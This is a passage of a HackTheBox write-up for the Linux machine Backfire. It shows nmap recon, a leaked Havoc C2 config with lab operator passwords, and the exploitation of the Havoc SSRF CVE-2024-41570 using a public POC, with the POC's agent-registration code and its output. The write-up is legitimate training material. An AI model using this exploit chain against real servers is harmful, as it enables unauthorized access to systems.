@@ -1,0 +1,834 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Backfire</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-backfire">htb-backfire</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#debian">debian</a> <a class="post-tag" href="/tags#havoc">havoc</a> <a class="post-tag" href="/tags#cve-2024-41570">cve-2024-41570</a> <a class="post-tag" href="/tags#ssrf">ssrf</a> <a class="post-tag" href="/tags#ssrf-websocket">ssrf-websocket</a> <a class="post-tag" href="/tags#chatgpt">chatgpt</a> <a class="post-tag" href="/tags#hardhatc2">hardhatc2</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#jwt">jwt</a> <a class="post-tag" href="/tags#jwt-default-secret">jwt-default-secret</a> <a class="post-tag" href="/tags#iptables">iptables</a> <a class="post-tag" href="/tags#iptables-save">iptables-save</a> <a class="post-tag" href="/tags#arbitrary-write">arbitrary-write</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-06-07T13:45:00+00:00" itemprop="datePublished">Jun 7, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/06/07/htb-backfire.html" style="color: #e6e6e6; text-decoration: none;">HTB: Backfire</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/backfire-cover.webp" type="image/webp"/>
+<img alt="Backfire" class="include_image" loading="lazy" src="/img/backfire-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Backfire is all about exploiting red team infrastructure, first Havoc, and then HardHatC2. I’ll start with a Havoc server and leak the configuration from the website. I’ll exploit an SSRF vulnerability to get access to the admin port internally. There’s an authenticated RCE vulnerability on this port, but it involves sending payloads into a websocket. I’ll create a chained exploit using the SSRF to stand up and communicate over a websocket to get command injection and a shell. From here, I’ll find an instance of HardHatC2, and exploit the default JWT secret to forge cookies and get access. Inside the C2 admin panel, I’ll get a shell as the next user. Finally, I’ll abuse a sudo rule that allows saving the firewall rules to get arbitrary write, and get a shell as root.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/643 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/backfire" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Backfire</a> <a href="https://hackthebox.com/machines/backfire" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-backfire.webp" type="image/webp"/> <img alt="Backfire" class="img-av" src="/icons/box-backfire.png"/></picture></a><br/><a href="https://hackthebox.com/machines/backfire" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1879936684332060734">18 Jan 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">07 Jun 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/backfire-diff.webp" type="image/webp"/><img alt="Rated difficulty for Backfire" src="/img/backfire-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/backfire-radar.webp" type="image/webp"/><img alt="Radar chart for Backfire" src="/img/backfire-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:14:50</span><a href="https://app.hackthebox.com/users/848478" rel="noopener" target="_blank"><img alt="fisstech" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/848478" style="display: unset"/><span class="user-text" style="display: none"> fisstech</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">02:35:22</span><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/49704" rel="noopener" target="_blank"><img alt="hyperreality" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/49704" style="display: unset"/><span class="user-text" style="display: none"> hyperreality</span></a><br/> <a href="https://app.hackthebox.com/users/1688469" rel="noopener" target="_blank"><img alt="chebuya" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/1688469" style="display: unset"/><span class="user-text" style="display: none"> chebuya</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds three open TCP ports, SSH (22), HTTPS (443) and HTTP (8000), as well as two filtered ports (5000 and 7096):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.49
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 13:29 EST
+Nmap scan report for 10.10.11.49
+Host is up (0.089s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+443/tcp  open     https
+5000/tcp filtered upnp
+7096/tcp filtered unknown
+8000/tcp open     http-alt
+
+Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,443,8000 <span class="nt">-sCV</span> 10.10.11.49
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 13:30 EST
+Nmap scan report for 10.10.11.49
+Host is up (0.085s latency).
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
+| ssh-hostkey: 
+|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
+|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
+443/tcp  open  ssl/http nginx 1.22.1
+| ssl-cert: Subject: commonName=127.0.0.1/stateOrProvinceName=Illinois/countryName=US
+| Subject Alternative Name: IP Address:127.0.0.1
+| Not valid before: 2024-07-16T17:28:10
+|_Not valid after:  2027-07-16T17:28:10
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: nginx/1.22.1
+| tls-alpn: 
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+|_http-title: 404 Not Found
+8000/tcp open  http     nginx 1.22.1
+|_http-title: Index of /
+|_http-server-header: nginx/1.22.1
+|_http-open-proxy: Proxy might be redirecting requests
+| http-ls: Volume /
+| SIZE  TIME               FILENAME
+| 1559  17-Dec-2024 11:31  disable_tls.patch
+| 875   17-Dec-2024 11:34  havoc.yaotl
+|_
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="/cheatsheets/os#debian">OpenSSH and nginx versions</a>, the host is likely running Debian 12 bookworm. There’s no sign of host-based routing or any kind of domain name, so I’ll proceed by targeting the IP.</p>
+<h3 id="website---tcp-443">Website - TCP 443</h3>
+<h4 id="site">Site</h4>
+<p>Visiting <code class="language-plaintext highlighter-rouge">https://10.10.11.49/</code> returns the <a href="/cheatsheets/404#nginx">default nginx 404</a>:</p>
+<picture>
+<source srcset="/img/image-20250124133226450.webp" type="image/webp"/>
+<img alt="image-20250124133226450" class="include_image" loading="lazy" src="/img/image-20250124133226450.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers show an interesting header besides the <code class="language-plaintext highlighter-rouge">Server</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">404</span> <span class="ne">Not Found</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.22.1</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 24 Jan 2025 18:33:17 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">X-Havoc</span><span class="p">:</span> <span class="s">true</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">146</span>
+</code></pre></div></div>
+<p>Searching in <a href="https://grep.app/search?q=x-havoc">grep.app</a> for <code class="language-plaintext highlighter-rouge">X-Havoc</code> shows a pretty solid match on Havoc:</p>
+<picture>
+<source srcset="/img/image-20250124133509255.webp" type="image/webp"/>
+<img alt="image-20250124133509255" class="include_image" loading="lazy" src="/img/image-20250124133509255.png"/>
+</picture>
+<p><a href="https://github.com/HavocFramework/Havoc">Havoc</a> is a Go-based post-exploitation C2 framework.</p>
+<p>Brute forcing directories with <code class="language-plaintext highlighter-rouge">feroxbuster</code> doesn’t find anything interesting.</p>
+<h3 id="http---tcp-8000">HTTP - TCP 8000</h3>
+<p>The site on port 8000 is just a directory listing with two files:</p>
+<picture>
+<source srcset="/img/image-20250124133821473.webp" type="image/webp"/>
+<img alt="image-20250124133821473" class="include_image" loading="lazy" src="/img/image-20250124133821473.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">disable_tls.patch</code> is a <a href="https://en.wikipedia.org/wiki/Patch_(Unix)">patch file</a> for the websocket post in Havoc to not require TLS:</p>
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Disable TLS for Websocket management port 40056, so I can prove that
+sergej is not doing any work
+Management port only allows local connections (we use ssh forwarding) so 
+this will not compromise our teamserver
+
+diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
+index abdf1b5..6be76fb 100644
+--- a/client/src/Havoc/Connector.cc
++++ b/client/src/Havoc/Connector.cc
+@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
+ {
+     Teamserver   = ConnectionInfo;
+     Socket       = new QWebSocket();
+-    auto Server  = "wss://" + Teamserver-&gt;Host + ":" + this-&gt;Teamserver-&gt;Port + "/havoc/";
++    auto Server  = "ws://" + Teamserver-&gt;Host + ":" + this-&gt;Teamserver-&gt;Port + "/havoc/";
+     auto SslConf = Socket-&gt;sslConfiguration();
+
+     /* ignore annoying SSL errors */
+     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
+-    Socket-&gt;setSslConfiguration( SslConf );
+     Socket-&gt;ignoreSslErrors();
+
+     QObject::connect( Socket, &amp;QWebSocket::binaryMessageReceived, this, [&amp;]( const QByteArray&amp; Message )
+diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
+index 9d1c21f..59d350d 100644
+--- a/teamserver/cmd/server/teamserver.go
++++ b/teamserver/cmd/server/teamserver.go
+@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
+         }
+
+         // start the teamserver
+-        if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
++        if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
+             logger.Error("Failed to start websocket: " + err.Error())
+         }
+</span></code></pre></div></div>
+<p>There’s a note here about catching a coworker being lazy, but more importantly a hint to access the management port 40056 only on localhost.</p>
+<p>The other file is a <code class="language-plaintext highlighter-rouge">.yaotl</code> file, which is the <a href="https://havocframework.com/docs/profiles">configuration language used by Havoc</a>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Teamserver <span class="o">{</span>
+    Host <span class="o">=</span> <span class="s2">"127.0.0.1"</span>
+    Port <span class="o">=</span> 40056
+
+    Build <span class="o">{</span>
+        Compiler64 <span class="o">=</span> <span class="s2">"data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"</span>
+        Compiler86 <span class="o">=</span> <span class="s2">"data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"</span>
+        Nasm <span class="o">=</span> <span class="s2">"/usr/bin/nasm"</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+Operators <span class="o">{</span>
+    user <span class="s2">"ilya"</span> <span class="o">{</span>
+        Password <span class="o">=</span> <span class="s2">"CobaltStr1keSuckz!"</span>
+    <span class="o">}</span>
+
+    user <span class="s2">"sergej"</span> <span class="o">{</span>
+        Password <span class="o">=</span> <span class="s2">"1w4nt2sw1tch2h4rdh4tc2"</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+Demon <span class="o">{</span>
+    Sleep <span class="o">=</span> 2
+    Jitter <span class="o">=</span> 15
+
+    TrustXForwardedFor <span class="o">=</span> <span class="nb">false
+
+    </span>Injection <span class="o">{</span>
+        Spawn64 <span class="o">=</span> <span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">notepad.exe"</span>
+        Spawn32 <span class="o">=</span> <span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">SysWOW64</span><span class="se">\\</span><span class="s2">notepad.exe"</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+Listeners <span class="o">{</span>
+    Http <span class="o">{</span>
+        Name <span class="o">=</span> <span class="s2">"Demon Listener"</span>
+        Hosts <span class="o">=</span> <span class="o">[</span>
+            <span class="s2">"backfire.htb"</span>
+        <span class="o">]</span>
+        HostBind <span class="o">=</span> <span class="s2">"127.0.0.1"</span> 
+        PortBind <span class="o">=</span> 8443
+        PortConn <span class="o">=</span> 8443
+        HostRotation <span class="o">=</span> <span class="s2">"round-robin"</span>
+        Secure <span class="o">=</span> <span class="nb">true</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>There are a couple users and passwords in the file, as well as the domain <code class="language-plaintext highlighter-rouge">backfire.htb</code>, and several ports listening on localhost.</p>
+<h2 id="shell-as-ilya">Shell as ilya</h2>
+<h3 id="strategy">Strategy</h3>
+<p>The foothold expliotation path is a bit complex, so I’ll give an overview of it before going into the particulars. I’ll blur this section for anyone not wanting to spoil what’s coming.</p>
+<div class="blurable"><p>Getting user involves chaining together two exploits in Havor, an unauthenticated server-side request forgery (SSRF), and an authenticated command injection remote code execution (RCE). The SSRF provides the authenticated access to the RCE vulnerability.</p>
+<p>When Backfire released on HTB, there were POC scripts for both the SSRF and for the RCE exploits. The SSRF one works as is on Backfire, but the RCE exploit is designed to go directly to the target. The challenge in Backfire was to take the RCE script and figure out how to use the SSRF to send the same payloads to target.</p>
+<p>Within days of Backfire's release, there were new POCs publicly available to chain these two exploits, but I'll skip those since they weren't available at the time I was originally solving the box, and it's a fun challenge to combine them, and show the challenge as it was on release day. </p></div>
+<h3 id="ssrf">SSRF</h3>
+<h4 id="identify-cve-2024-41570">Identify CVE-2024-41570</h4>
+<p>Searching for “Havoc CVE” leads to CVE-2024-41570:</p>
+<picture>
+<source srcset="/img/image-20250124134532894.webp" type="image/webp"/>
+<img alt="image-20250124134532894" class="include_image" loading="lazy" src="/img/image-20250124134532894.png"/>
+</picture>
+<h4 id="background">Background</h4>
+<p>The <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41570">NVD page</a> describes the vulnerability as:</p>
+<blockquote>
+<p>An Unauthenticated Server-Side Request Forgery (SSRF) in demon callback handling in Havoc 2 0.7 allows  attackers to send arbitrary network traffic originating from the team  server.</p>
+</blockquote>
+<p>A <a href="https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/">full writeup</a> is available from chebuya’s (one of the authors of Backfile) blog, and it goes into a ton of detail. I’ll give a higher level overview here.</p>
+<p>In Havoc, the default malware / agent is called a demon. The actor on the Havoc server will create listeners (typically HTTP(S)), which the demon’s connect to.</p>
+<p>When the demon connects to a listener, it accesses a command by a 32-bit int. For example, 99 is DEMON_INITIALIZE, as seen in the <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/payloads/Demon/include/core/Command.h#L38">source here</a>, or in <a href="https://github.com/chebuya/Havoc-C2-SSRF-poc/blob/main/exploit.py#L58-L83">the POC exploit script</a> in the <code class="language-plaintext highlighter-rouge">register_agent</code> function:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">register_agent</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">domain_name</span><span class="p">,</span> <span class="n">internal_ip</span><span class="p">,</span> <span class="n">process_name</span><span class="p">,</span> <span class="n">process_id</span><span class="p">):</span>
+    <span class="c1"># DEMON_INITIALIZE / 99
+</span>    <span class="n">command</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x00\x00\x63</span><span class="sh">"</span>
+    <span class="n">request_id</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x00\x00\x01</span><span class="sh">"</span>
+    <span class="n">demon_id</span> <span class="o">=</span> <span class="n">agent_id</span>
+
+    <span class="n">hostname_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">hostname</span><span class="p">))</span>
+    <span class="n">username_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">username</span><span class="p">))</span>
+    <span class="n">domain_name_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">domain_name</span><span class="p">))</span>
+    <span class="n">internal_ip_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">internal_ip</span><span class="p">))</span>
+    <span class="n">process_name_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">process_name</span><span class="p">)</span> <span class="o">-</span> <span class="mi">6</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">"</span><span class="se">\xab</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">100</span>
+
+    <span class="n">header_data</span> <span class="o">=</span> <span class="n">command</span> <span class="o">+</span> <span class="n">request_id</span> <span class="o">+</span> <span class="n">AES_Key</span> <span class="o">+</span> <span class="n">AES_IV</span> <span class="o">+</span> <span class="n">demon_id</span> <span class="o">+</span> <span class="n">hostname_length</span> <span class="o">+</span> <span class="n">hostname</span> <span class="o">+</span> <span class="n">username_length</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="n">domain_name_length</span> <span class="o">+</span> <span class="n">domain_name</span> <span class="o">+</span> <span class="n">internal_ip_length</span> <span class="o">+</span> <span class="n">internal_ip</span> <span class="o">+</span> <span class="n">process_name_length</span> <span class="o">+</span> <span class="n">process_name</span> <span class="o">+</span> <span class="n">process_id</span> <span class="o">+</span> <span class="n">data</span>
+
+    <span class="n">size</span> <span class="o">=</span> <span class="mi">12</span> <span class="o">+</span> <span class="nf">len</span><span class="p">(</span><span class="n">header_data</span><span class="p">)</span>
+    <span class="n">size_bytes</span> <span class="o">=</span> <span class="n">size</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">agent_header</span> <span class="o">=</span> <span class="n">size_bytes</span> <span class="o">+</span> <span class="n">magic</span> <span class="o">+</span> <span class="n">agent_id</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[***] Trying to register agent...</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">teamserver_listener_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">agent_header</span> <span class="o">+</span> <span class="n">header_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[***] Success!</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!!!] Failed to register agent - </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The vast majority of these commands are authenticated. Only if the listener issues a command to do something will it process the command from the demon in response. This is checked with the <code class="language-plaintext highlighter-rouge">IsKnownRequestID</code> <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/agent/agent.go#L609-L629">function</a> in Havoc in the <code class="language-plaintext highlighter-rouge">TaskDispatch</code> <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/agent/demons.go#L2290">function</a>:</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span><span class="n">Agent</span><span class="p">)</span> <span class="n">TaskDispatch</span><span class="p">(</span><span class="n">RequestID</span> <span class="kt">uint32</span><span class="p">,</span> <span class="n">CommandID</span> <span class="kt">uint32</span><span class="p">,</span> <span class="n">Parser</span> <span class="o">*</span><span class="n">parser</span><span class="o">.</span><span class="n">Parser</span><span class="p">,</span> <span class="n">teamserver</span> <span class="n">TeamServer</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">var</span> <span class="n">NameID</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">strconv</span><span class="o">.</span><span class="n">ParseInt</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">NameID</span><span class="p">,</span> <span class="m">16</span><span class="p">,</span> <span class="m">64</span><span class="p">)</span>
+    <span class="n">AgentID</span> <span class="o">:=</span> <span class="kt">int</span><span class="p">(</span><span class="n">NameID</span><span class="p">)</span>
+
+    <span class="c">/* if the RequestID was not generated by the TS, reject the request */</span>
+    <span class="k">if</span> <span class="n">a</span><span class="o">.</span><span class="n">IsKnownRequestID</span><span class="p">(</span><span class="n">teamserver</span><span class="p">,</span> <span class="n">RequestID</span><span class="p">,</span> <span class="n">CommandID</span><span class="p">)</span> <span class="o">==</span> <span class="no">false</span> <span class="p">{</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">Warn</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Agent: %x, CommandID: %d, unknown RequestID: %x. This is either a bug or malicious activity"</span><span class="p">,</span> <span class="n">AgentID</span><span class="p">,</span> <span class="n">CommandID</span><span class="p">,</span> <span class="n">RequestID</span><span class="p">))</span>
+        <span class="k">return</span>
+    <span class="p">}</span>
+
+    <span class="k">switch</span> <span class="n">CommandID</span> <span class="p">{</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+</code></pre></div></div>
+<p>However, at the top of <code class="language-plaintext highlighter-rouge">IsKnownRequestID</code>, there are a couple exceptions:</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">// check that the request the agent is valid</span>
+<span class="k">func</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span><span class="n">Agent</span><span class="p">)</span> <span class="n">IsKnownRequestID</span><span class="p">(</span><span class="n">teamserver</span> <span class="n">TeamServer</span><span class="p">,</span> <span class="n">RequestID</span> <span class="kt">uint32</span><span class="p">,</span> <span class="n">CommandID</span> <span class="kt">uint32</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
+    <span class="c">// some commands are always accepted because they don't follow the "send task and get response" format</span>
+    <span class="k">switch</span> <span class="n">CommandID</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="n">COMMAND_SOCKET</span><span class="o">:</span>
+        <span class="k">return</span> <span class="no">true</span>
+    <span class="k">case</span> <span class="n">COMMAND_PIVOT</span><span class="o">:</span>
+        <span class="k">return</span> <span class="no">true</span>
+    <span class="p">}</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>    
+</code></pre></div></div>
+<p>If the command is <code class="language-plaintext highlighter-rouge">COMMAND_SOCKET</code> or <code class="language-plaintext highlighter-rouge">COMMAND_PIVOT</code>, then this just returns true. This means that the demon can contact the C2 with one of these commands and it doesn’t matter that it never issued a request for it. The reason is that these are used for proxying data and creating tunnels.</p>
+<p>With these commands, the researcher was able to generate a SSRF.</p>
+<h4 id="run-poc">Run POC</h4>
+<p>The second link in the search above is a <a href="https://github.com/chebuya/Havoc-C2-SSRF-poc">POC on GitHub</a>, which is associated with the blog post. I’ll save a copy of the script. It doesn’t document what libraries are needed, but it turns out it’s <code class="language-plaintext highlighter-rouge">requests</code> and <code class="language-plaintext highlighter-rouge">pycryptodome</code>. I’ll add these with <code class="language-plaintext highlighter-rouge">uv</code> (check out the <a href="/cheatsheets/uv#">uv cheatsheet</a> for details):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv add <span class="nt">--script</span> exploit.py requests pycryptodome
+<span class="go">Updated `exploit.py`
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py
+<span class="go">Installed 6 packages in 8ms
+usage: exploit.py [-h] -t TARGET -i IP -p PORT [-A USER_AGENT] [-H HOSTNAME] [-u USERNAME]
+                  [-d DOMAIN_NAME] [-n PROCESS_NAME] [-ip INTERNAL_IP]
+exploit.py: error: the following arguments are required: -t/--target, -i/--ip, -p/--port
+</span></code></pre></div></div>
+<p>I’ll give the script the target as well as a reference to the IP and port to make a request to (my HTB VPN IP):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py <span class="nt">-t</span> https://10.10.11.49 <span class="nt">-i</span> 10.10.14.6 <span class="nt">-p</span> 80
+<span class="go">[***] Trying to register agent...
+[***] Success!
+[***] Trying to open socket on the teamserver...
+[***] Success!
+[***] Trying to write to the socket
+[***] Success!
+[***] Trying to poll teamserver for socket output...
+[***] Read socket output successfully!
+HTTP/1.0 404 File not found
+Server: SimpleHTTP/0.6 Python/3.12.3
+Date: Fri, 24 Jan 2025 18:51:43 GMT
+Connection: close
+Content-Type: text/html;charset=utf-8
+Content-Length: 335
+
+&lt;!DOCTYPE HTML&gt;
+&lt;html lang="en"&gt;
+    &lt;head&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;title&gt;Error response&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Error response&lt;/h1&gt;
+        &lt;p&gt;Error code: 404&lt;/p&gt;
+        &lt;p&gt;Message: File not found.&lt;/p&gt;
+        &lt;p&gt;Error code explanation: 404 - Nothing matches the given URI.&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>On my Python webserver, there’s a request for <code class="language-plaintext highlighter-rouge">/vulnerable</code>, which returns the 404 response shown above:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>python <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.49 - - [24/Jan/2025 13:51:43] code 404, message File not found
+10.10.11.49 - - [24/Jan/2025 13:51:43] "GET /vulnerable HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<h4 id="enumerating">Enumerating</h4>
